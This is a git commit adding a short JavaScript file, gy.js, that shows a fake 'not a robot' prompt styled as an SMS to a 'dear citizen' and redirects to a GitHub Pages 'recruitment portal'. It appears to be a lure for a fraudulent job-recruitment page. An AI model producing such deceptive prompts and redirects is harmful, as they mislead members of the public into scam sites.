0521cb980ff95171b11c671ef6bb0e0671ad28d4
allregnws <promisebassey8081@gmail.com>
2025-05-24 12:49:02 +0100

    Create gy.js

---
+++ gy.js
@@ -0,0 +1,5 @@
+var password = 'GPI'
+password=prompt('SMS :Welcome dear citizen to our recruitment portal. Click OK to verify that you are not a robot ','GPI');
+if (password != 'GPI') {
+location.href='https://allregnws.github.io/GPI.Recruitment.Portal';
+}
